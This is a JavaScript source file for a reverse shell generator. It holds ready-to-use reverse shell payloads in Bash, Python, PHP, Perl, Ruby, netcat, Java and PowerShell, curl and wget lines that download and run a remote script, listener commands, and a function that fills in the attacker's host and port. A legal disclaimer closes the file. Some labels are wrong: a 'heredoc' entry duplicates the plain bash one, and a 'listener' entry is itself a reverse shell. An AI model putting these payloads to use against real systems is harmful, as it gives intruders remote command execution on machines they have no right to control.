// Reverse Shell Generator - Educational tool for penetration testing
// WARNING: For authorized testing and educational purposes only

export const reverseShellPayloads = {
  bash: {
    name: 'Bash',
    description: 'Bash reverse shell over TCP',
    category: 'Shell',
    payloads: [
      {
        name: 'Bash TCP (simple)',
        code: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
      },
      {
        name: 'Bash with exec',
        code: 'exec bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
      },
      {
        name: 'Bash with heredoc',
        code: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
      }
    ]
  },
  python: {
    name: 'Python',
    description: 'Python reverse shell',
    category: 'Language',
    payloads: [
      {
        name: 'Python socket',
        code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        multiline: 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("{LHOST}",{LPORT}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])'
      },
      {
        name: 'Python 3',
        code: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        multiline: 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("{LHOST}",{LPORT}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])'
      }
    ]
  },
  php: {
    name: 'PHP',
    description: 'PHP reverse shell',
    category: 'Web',
    payloads: [
      {
        name: 'PHP exec',
        code: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'"); ?>'
      },
      {
        name: 'PHP system',
        code: '<?php system("/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'"); ?>'
      },
      {
        name: 'PHP socket',
        code: '<?php $sock=fsockopen("{LHOST}",{LPORT}); exec("/bin/bash -i <&3 >&3 2>&3"); ?>'
      }
    ]
  },
  perl: {
    name: 'Perl',
    description: 'Perl reverse shell',
    category: 'Language',
    payloads: [
      {
        name: 'Perl socket',
        code: 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        multiline: 'use Socket;\n$i="{LHOST}";\n$p={LPORT};\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\n  open(STDIN,">&S");\n  open(STDOUT,">&S");\n  open(STDERR,">&S");\n  exec("/bin/sh -i");\n};'
      }
    ]
  },
  ruby: {
    name: 'Ruby',
    description: 'Ruby reverse shell',
    category: 'Language',
    payloads: [
      {
        name: 'Ruby socket',
        code: 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{LHOST}",{LPORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
        multiline: 'require "socket"\nexit if fork\nc=TCPSocket.new("{LHOST}",{LPORT})\nwhile(cmd=c.gets)\n  IO.popen(cmd,"r"){|io|c.print io.read}\nend'
      }
    ]
  },
  netcat: {
    name: 'Netcat',
    description: 'Netcat and nc variations',
    category: 'Utility',
    payloads: [
      {
        name: 'Netcat with /bin/sh',
        code: 'nc {LHOST} {LPORT} -e /bin/sh'
      },
      {
        name: 'Netcat with bash',
        code: 'nc {LHOST} {LPORT} -e /bin/bash'
      },
      {
        name: 'Netcat mkfifo (Linux)',
        code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'
      },
      {
        name: 'nc with pipe',
        code: '/bin/sh | nc {LHOST} {LPORT}'
      }
    ]
  },
  java: {
    name: 'Java',
    description: 'Java reverse shell',
    category: 'Language',
    payloads: [
      {
        name: 'Java Runtime.exec',
        code: 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();'
      }
    ]
  },
  powershell: {
    name: 'PowerShell',
    description: 'Windows PowerShell reverse shell',
    category: 'Windows',
    payloads: [
      {
        name: 'PowerShell socket',
        code: '$client = New-Object System.Net.Sockets.TcpClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
        multiline: '$client = New-Object System.Net.Sockets.TcpClient("{LHOST}",{LPORT})\n$stream = $client.GetStream()\n[byte[]]$buffer = 0..65535|%{0}\nwhile(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)\n  $sendback = (iex $data 2>&1 | Out-String )\n  $sendback2 = $sendback + "PS " + (pwd).Path + "> "\n  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n  $stream.Write($sendbyte,0,$sendbyte.Length)\n  $stream.Flush()\n}\n$client.Close()'
      }
    ]
  },
  curl: {
    name: 'cURL/wget',
    description: 'Download and execute reverse shell',
    category: 'Download',
    payloads: [
      {
        name: 'cURL download and execute',
        code: 'curl http://{LHOST}:{LPORT}/shell.sh | bash'
      },
      {
        name: 'wget download and execute',
        code: 'wget -O - http://{LHOST}:{LPORT}/shell.sh | bash'
      }
    ]
  }
}

export const listenerCommands = {
  netcat: {
    name: 'Netcat Listener',
    description: 'Listen for incoming reverse shell connection',
    command: 'nc -lvnp {LPORT}'
  },
  ncat: {
    name: 'Ncat Listener',
    description: 'Nmap ncat listener',
    command: 'ncat -lvnp {LPORT}'
  },
  socat: {
    name: 'Socat Listener',
    description: 'Socat reverse shell listener',
    command: 'socat file:`tty`,raw,echo=0 TCP-LISTEN:{LPORT},reuseaddr'
  },
  bash: {
    name: 'Bash Listener',
    description: 'Listen with bash',
    command: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
  }
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(reverseShellPayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(reverseShellPayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const generatePayload = (template, lhost, lport) => {
  if (!lhost || !lport) {
    return template
  }
  return template
    .replace(/{LHOST}/g, lhost)
    .replace(/{LPORT}/g, lport)
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Reverse shells can be dangerous tools. Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized access to computer systems is ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Fines

By using this tool, you acknowledge that you will use it responsibly and legally.
`
